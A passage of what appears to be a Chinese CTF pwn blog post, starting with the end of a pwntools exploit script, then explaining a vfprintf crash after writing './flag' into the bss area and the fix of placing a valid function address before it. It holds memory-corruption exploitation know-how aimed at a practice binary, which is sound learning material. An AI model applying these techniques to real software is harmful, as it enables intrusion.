class="line"></span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
+
+<h1 id="报错-烦烦烦-╥╯-╰╥"><a href="#报错-烦烦烦-╥╯-╰╥" class="headerlink" title="报错(烦烦烦(╥╯^╰╥))"></a>报错(烦烦烦(╥╯^╰╥))</h1><p>程序停在了0x7f022ec7a1a4 &lt;vfprintf+36&gt; mov   eax  dword ptr [rdi + 0xc0]这里  </p>
+<p>报错则是Program received signal SIGSEGV (fault address 0x67616c662fee)<br><img src="/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912210146.png" alt="Alt text"><br>而错误地址0x67616c662fee就是我发送的”./flag\x00”的字符。<br><img src="/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912210936.png" alt="Alt text"><br>所以我猜测是发送了”./flag”的原因(发送到bss区(0x6020a0))，但怎么调也没用 (ㄒoㄒ)</p>
+<h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>最后发现vfprintf+36调用的都是同一个地址里的数据，也就是bss区的起始地址的数据(0x6020a0)。<br>而且报错说的是这是一个错误的地址，确实”./flag”也不是一个正确的地址，那我就往0x6020a0里随便写一个正确的函数的地址，后面再加”./flag”,结果就真的打通了！（⺻▽⺻ ）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/" data-id="clmh37sna000d14v9626m5le2" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/09/08/%E9%9D%99%E6%80%81rop4%E8%BF%9E-fini-array%E6%9E%84%E9%80%A0rop%E9%93%BE/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">静态rop4连:fini_array构造rop链</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/">scanf函数漏洞的利用及&lt;vfprintf&gt;如何解决</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/08/%E9%9D%99%E6%80%81rop4%E8%BF%9E-fini-array%E6%9E%84%E9%80%A0rop%E9%93%BE/">静态rop4连:fini_array构造rop链</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/05/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">整数溢出</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/12/one-gadget/">one_gadget</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/09/%E6%9E%84%E9%80%A0python%E8%84%9A%E6%9C%AC%E7%9A%84%E5%93%AA%E4%BA%9B%E4%BA%8B/">构造python脚本的哪些事</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
